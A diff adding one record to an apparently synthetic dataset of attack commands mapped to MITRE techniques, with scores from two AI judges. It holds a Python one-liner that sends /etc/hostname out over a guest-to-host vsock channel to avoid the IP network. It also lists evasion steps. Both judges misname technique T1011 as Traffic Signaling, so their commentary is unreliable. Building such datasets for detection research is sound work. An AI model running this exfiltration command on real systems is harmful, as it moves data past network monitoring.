@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 47419)); s.sendall(open('/etc/hostname','rb').read()); s.close()\"",
+  "explanation": "Exfiltrates via VMCI/virtio-vsock (guest-to-host) using AF_VSOCK to avoid the IP network path entirely, consistent with T1011.",
+  "rationale_steps": [
+    "Select vsock (AF_VSOCK) to leverage hypervisor-mediated transport.",
+    "Connect to host CID 2 on a nonstandard port (47419).",
+    "Read and send /etc/hostname over the vsock stream.",
+    "Close the connection to reduce residual indicators."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-dce5dd42",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner has balanced quotes and parentheses, valid socket calls, and proper separators, making it parseable and runnable as-is.",
+        "semantic_score": 3,
+        "semantic_justification": "It plausibly exfiltrates /etc/hostname over AF_VSOCK to the host (CID 2) if vsock is available, but this is not Traffic Signaling as described (no embedding of signals within legitimate-looking traffic), so the mapping to T1011 is weak.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T16:57:33.495475Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid Python syntax for socket operations, and includes balanced quotes and parentheses.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely achieves the stated goal of exfiltrating data via AF_VSOCK guest-to-host, bypassing the IP network, which is a strong fit for the covert channel and evasion aspects of T1011 Traffic Signaling.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T16:57:47.431081Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
